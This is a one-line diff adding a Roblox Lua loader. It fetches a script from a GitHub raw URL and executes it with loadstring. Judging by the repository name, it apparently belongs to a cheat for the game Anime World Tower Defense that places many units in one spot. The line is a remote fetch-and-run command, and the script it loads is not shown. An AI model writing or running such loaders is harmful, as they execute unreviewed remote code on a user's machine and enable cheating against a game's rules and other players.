@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/john-gamedevelopment/Anime-World-Tower-Defense-place-1-bazillion-units-one-spot/refs/heads/main/a",true))()
